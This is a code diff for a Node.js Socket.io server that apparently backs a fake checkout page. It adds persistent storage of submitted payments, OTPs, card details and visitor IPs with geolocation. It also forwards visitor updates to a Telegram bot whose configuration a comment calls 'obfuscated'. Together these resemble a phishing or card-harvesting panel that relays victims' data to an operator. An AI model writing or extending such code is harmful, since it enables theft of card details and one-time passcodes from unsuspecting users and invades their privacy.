@@ -5,6 +5,8 @@ import path from 'path';
 import { fileURLToPath } from 'url';
 import pathToRegexp from 'path-to-regexp';
 import { match } from 'path-to-regexp';
+import fs from 'fs/promises';
+import { existsSync } from 'fs';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -28,7 +30,24 @@ const corsOptions = {
 
 const io = new Server(server, {
   cors: corsOptions,
-  transports: ['websocket', 'polling']
+  transports: ['websocket', 'polling'],
+  // Enhanced settings for mobile and low internet connections
+  pingTimeout: 120000, // 2 minutes - longer timeout for mobile
+  pingInterval: 25000,  // 25 seconds - more frequent pings
+  upgradeTimeout: 30000, // 30 seconds for upgrade timeout
+  allowUpgrades: true,
+  perMessageDeflate: {
+    threshold: 1024,
+    zlibDeflateOptions: {
+      chunkSize: 1024,
+      windowBits: 13,
+      level: 3
+    }
+  },
+  httpCompression: {
+    threshold: 1024
+  },
+  maxHttpBufferSize: 1e8 // 100MB for large data transfers
 });
 
 // 🔐 Obfuscated Telegram Bot Configuration (Auto-configured for live visitor tracking)
@@ -67,31 +86,96 @@ const successfulPayments = new Map();
 const adminData = {
   payments: [],
   otps: [],
-  globalCurrency: 'INR' // Default currency
+  globalCurrency: 'INR', // Default currency
+  visitors: [], // Store visitor history for persistence
+  cardDetails: [] // Store submitted card details
 };
+
+// File paths for persistent storage
+const DATA_DIR = path.join(__dirname, 'data');
+const ADMIN_DATA_FILE = path.join(DATA_DIR, 'admin-data.json');
+const VISITORS_FILE = path.join(DATA_DIR, 'visitors-history.json');
+const PAYMENTS_FILE = path.join(DATA_DIR, 'payments-history.json');
 
 // Store current exchange rate (USD to INR)
 let currentExchangeRate = 83.0; // Default rate, will be updated by API
 
-// Load existing admin data from file/storage
-function loadAdminData() {
+// Ensure data directory exists
+async function ensureDataDirectory() {
   try {
-    // In production, this could be a database. For now, using memory with backup
-    console.log('Admin data initialized');
+    if (!existsSync(DATA_DIR)) {
+      await fs.mkdir(DATA_DIR, { recursive: true });
+      console.log('📁 Data directory created');
+    }
   } catch (error) {
-    console.error('Error loading admin data:', error);
+    console.error('Error creating data directory:', error);
   }
 }
 
-// Save admin data (could be to file or database)
-function saveAdminData() {
+// Load existing admin data from file/storage
+async function loadAdminData() {
   try {
-    // Data is kept in memory and sent to clients
-    console.log(`Admin data saved: ${adminData.payments.length} payments, ${adminData.otps.length} otps, ${activeVisitors.size} active visitors`);
+    await ensureDataDirectory();
+    
+    // Load admin data
+    if (existsSync(ADMIN_DATA_FILE)) {
+      const data = await fs.readFile(ADMIN_DATA_FILE, 'utf8');
+      const savedData = JSON.parse(data);
+      Object.assign(adminData, savedData);
+      console.log(`💾 Loaded admin data: ${adminData.payments.length} payments, ${adminData.otps.length} otps, ${adminData.visitors.length} visitors, ${adminData.cardDetails.length} card details`);
+    }
+    
+    // Load visitor history
+    if (existsSync(VISITORS_FILE)) {
+      const visitorData = await fs.readFile(VISITORS_FILE, 'utf8');
+      const visitors = JSON.parse(visitorData);
+      adminData.visitors = visitors;
+      console.log(`👥 Loaded ${visitors.length} visitor records`);
+    }
+    
+    // Load payment history
+    if (existsSync(PAYMENTS_FILE)) {
+      const paymentData = await fs.readFile(PAYMENTS_FILE, 'utf8');
+      const payments = JSON.parse(paymentData);
+      adminData.payments = payments;
+      console.log(`💳 Loaded ${payments.length} payment records`);
+    }
+    
+    console.log('✅ Admin data initialized with persistent storage');
   } catch (error) {
-    console.error('Error saving admin data:', error);
+    console.error('❌ Error loading admin data:', error);
+    // Initialize with defaults if loading fails
+    adminData.payments = [];
+    adminData.otps = [];
+    adminData.visitors = [];
+    adminData.cardDetails = [];
   }
 }
+
+// Save admin data to persistent storage
+async function saveAdminData() {
+  try {
+    await ensureDataDirectory();
+    
+    // Save admin data
+    await fs.writeFile(ADMIN_DATA_FILE, JSON.stringify(adminData, null, 2));
+    
+    // Save visitor history separately for better performance
+    await fs.writeFile(VISITORS_FILE, JSON.stringify(adminData.visitors, null, 2));
+    
+    // Save payment history separately
+    await fs.writeFile(PAYMENTS_FILE, JSON.stringify(adminData.payments, null, 2));
+    
+    console.log(`💾 Admin data saved: ${adminData.payments.length} payments, ${adminData.otps.length} otps, ${activeVisitors.size} active visitors, ${adminData.visitors.length} visitor history, ${adminData.cardDetails.length} card details`);
+  } catch (error) {
+    console.error('❌ Error saving admin data:', error);
+  }
+}
+
+// Auto-save data every 30 seconds
+setInterval(async () => {
+  await saveAdminData();
+}, 30000);
 
 // Initialize admin data
 loadAdminData();
@@ -410,25 +494,92 @@ setInterval(() => {
 
 // Socket.io connection handling
 io.on('connection', (socket) => {
-  // User connected silently
+  console.log(`🔌 New connection: ${socket.id} from ${socket.handshake.address}`);
+
+  // Enhanced visitor tracking with persistence
+  socket.on('visitor-joined', async (data) => {
+    try {
+      const geoInfo = await getVisitorGeoInfo(data.ipAddress || 'unknown');
+      const visitorData = {
+        visitorId: socket.id,
+        ipAddress: data.ipAddress || 'unknown',
+        userAgent: data.userAgent || 'unknown',
+        timestamp: new Date().toISOString(),
+        lastActivity: new Date().toISOString(),
+        geo: geoInfo,
+        socketId: socket.id,
+        status: 'active'
+      };
+
+      activeVisitors.set(socket.id, visitorData);
+      
+      // Add to persistent visitor history
+      adminData.visitors.unshift(visitorData);
+      
+      // Keep only last 1000 visitors to prevent memory issues
+      if (adminData.visitors.length > 1000) {
+        adminData.visitors = adminData.visitors.slice(0, 1000);
+      }
+
+      // Send to Telegram
+      sendVisitorUpdateToTelegram(visitorData, geoInfo);
+      
+      // Save immediately
+      await saveAdminData();
+      
+      // Send current active visitors to admin
+      io.emit('visitors-update', Array.from(activeVisitors.values()));
+      
+    } catch (error) {
+      console.error('❌ Error handling visitor-joined:', error);
+    }
+  });
+
+  // Handle visitor heartbeat for mobile connections
+  socket.on('visitor-heartbeat', async (data) => {
+    const visitor = activeVisitors.get(socket.id);
+    if (visitor) {
+      visitor.lastActivity = new Date().toISOString();
+      
+      // Update persistent storage
+      const visitorIndex = adminData.visitors.findIndex(v => v.socketId === socket.id);
+      if (visitorIndex !== -1) {
+        adminData.visitors[visitorIndex].lastActivity = visitor.lastActivity;
+      }
+      
+      await saveAdminData();
+    }
+  });
 
   // Handle payment data from checkout page
-  socket.on('payment-data', (data) => {
+  socket.on('payment-data', async (data) => {
     console.log('Payment data received:', data);
     
     // Add to persistent storage
-    const paymentWithId = {
+    const paymentRecord = {
       ...data,
-      id: data.paymentId || `payment_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
-      status: 'pending',
-      timestamp: data.timestamp || new Date().toISOString()
+      timestamp: new Date().toISOString(),
+      id: data.hash,
+      processed: false,
+      ipAddress: data.ipAddress || 'unknown',
+      userAgent: data.userAgent || 'unknown'
     };
     
-    adminData.payments.push(paymentWithId);
-    saveAdminData();
+    adminData.payments.unshift(paymentRecord);
     
-    // Emit to ALL clients (including admin panels)
-    io.emit('payment-received', paymentWithId);
+    // Keep only last 500 payments
+    if (adminData.payments.length > 500) {
+      adminData.payments = adminData.payments.slice(0, 500);
+    }
+    
+    console.log(`💳 Payment data stored: ${data.hash} - ${data.plan} (${data.billing})`);
+    
+    // Save immediately
+    await saveAdminData();
+    
+    // Emit to admin panel
+    io.emit('payment-data', data);
+    io.emit('analytics-update', calculatePaymentAnalytics());
   });
 
   // Handle visitor tracking with enhanced heartbeat mechanism
@@ -468,13 +619,25 @@ io.on('connection', (socket) => {
     }
   });
 
-  socket.on('visitor-left', (data) => {
-    console.log('Visitor left:', data);
-    // Remove from active visitors
-    if (socket.visitorData) {
+  socket.on('disconnect', async () => {
+    const visitor = activeVisitors.get(socket.id);
+    if (visitor) {
+      console.log(`👋 Visitor disconnected: ${visitor.visitorId}`);
+      
+      // Update visitor status in persistent storage
+      const visitorIndex = adminData.visitors.findIndex(v => v.socketId === socket.id);
+      if (visitorIndex !== -1) {
+        adminData.visitors[visitorIndex].status = 'disconnected';
+        adminData.visitors[visitorIndex].disconnectedAt = new Date().toISOString();
+      }
+      
       activeVisitors.delete(socket.id);
-      io.emit('visitor-left', { visitorId: socket.visitorData.visitorId });
-      socket.visitorData = null;
+      
+      // Save immediately
+      await saveAdminData();
+      
+      io.emit('visitor-left', { visitorId: visitor.visitorId });
+      io.emit('visitors-update', Array.from(activeVisitors.values()));
     }
   });
 
@@ -529,23 +692,23 @@ io.on('connection', (socket) => {
   });
 
   // Handle admin panel connection - send historical data
-  socket.on('admin-connected', () => {
-    console.log('Admin panel connected, performing aggressive cleanup');
+  socket.on('admin-connected', async () => {
+    console.log('👨‍💻 Admin panel connected, loading persistent data...');
     
-    // NUCLEAR OPTION: Clear ALL visitors and start fresh
-    const oldCount = activeVisitors.size;
-    activeVisitors.clear();
-    console.log(`🔥 NUCLEAR CLEANUP: Cleared ${oldCount} visitors completely`);
+    // Load persistent data instead of clearing
+    const visitors = Array.from(activeVisitors.values());
+    const analytics = calculatePaymentAnalytics();
     
-    // Send completely fresh data (no visitors)
-    socket.emit('admin-historical-data', {
+    // Send current state
+    socket.emit('visitors-update', visitors);
+    socket.emit('admin-data-loaded', {
+      visitors: adminData.visitors,
       payments: adminData.payments,
-      visitors: [], // Always empty on admin connect
       otps: adminData.otps,
-      activeVisitors: []
+      cardDetails: adminData.cardDetails
     });
     
-    // Auto-configure Telegram bot settings in admin panel
+    console.log(`📊 Admin data sent: ${visitors.length} active visitors, ${adminData.payments.length} payments, ${adminData.visitors.length} visitor history`);
     socket.emit('telegram-auto-config', {
       botToken: telegramConfig.botToken,
       chatId: telegramConfig.chatId,
@@ -554,8 +717,9 @@ io.on('connection', (socket) => {
     });
     
     // Send initial analytics data
-    const analytics = calculatePaymentAnalytics();
-    socket.emit('analytics-initial', analytics);
+    const initialAnalytics = calculatePaymentAnalytics();
+    socket.emit('analytics-update', initialAnalytics);
+    socket.emit('analytics-initial', initialAnalytics);
     
     console.log('✅ Admin connected with completely fresh visitor data');
     console.log('🤖 Telegram settings auto-configured for admin panel');
